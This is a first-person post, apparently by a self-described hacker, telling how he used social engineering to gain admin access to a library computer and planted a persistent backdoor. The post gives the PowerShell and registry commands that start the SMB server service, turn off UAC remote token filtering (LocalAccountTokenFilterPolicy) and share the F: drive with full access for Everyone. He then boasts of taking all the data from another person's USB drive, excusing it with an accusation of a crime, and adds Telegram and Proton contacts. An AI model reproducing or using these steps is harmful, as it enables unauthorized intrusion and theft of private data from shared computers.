It was 9 may 2026 Saturday and i was in a library and my goal was to acccess a computer's external hard disk or usb storage through smbclient using kali machine I  hade get access for 15 minutes on target computer with admin access powershell  using social engneiring . then i checked there was 3 disk partetions (C,D and E) C and D was computer's default and E was DVD default  if I want i can also penteste on that but my goal was on next external drive beacause the that persone was a pedophile and he was selling videos on D@rkWeb and all his data was in his Usb So I need proof for that .So i just start deep thinking that if these are drives by default it means if anyone plugged external storage drive/disk/usb it would be Partetion F and i was right ...

The Attack 
I first sstart the lanmanserver and set it to automatic for next time and create a share .
Start-Service lanmanserver
Set-Service -Name lanmanserver  -StartupType “Automatic”

Then I checked it's working good with..
Get-Service lanmanserver
(Get-Service lanmanserver).StartupType

Now i need to change the window registry from 0 to 1 if i did'nt do that attack would be fail  I did that using following command;
The Folder: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system
The Page (Value): LocalAccountTokenFilterPolicy
The Setting (Data): 0 means OFF, 1 means ON.
COMMAND:
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f


After that I created a smb share for F drive Using following command  when an external drive will be connect there i can got access from the smbclient beacaus I have already access into smb using local user account name ‘Students User’.
COMMAND:
New-SmbShare -Name “e_drive” -Path “F:\” -FullAccess “Everyone”
 Then I verify all the things ,
 Get-SmbShare >>> was working good 
 Get-Service lanmanserver >>>>> runing 
 (Get-Service lanmanserver).StartupType
 
 now today at 10 may 2026  10am i was in library and that person plugged his E.Usb and i finnaly got access into my target and i get * all his personal data from that usb 
 tell me how was my attack and mind thinking also visit my portfolio at https://contrastx.vercel.app/
 contact me: 
 telegram: @DarkFR722
 proton: contrastX@proton.me
 portfolio:  https://contrastx.vercel.app/
 Thanks for Reading 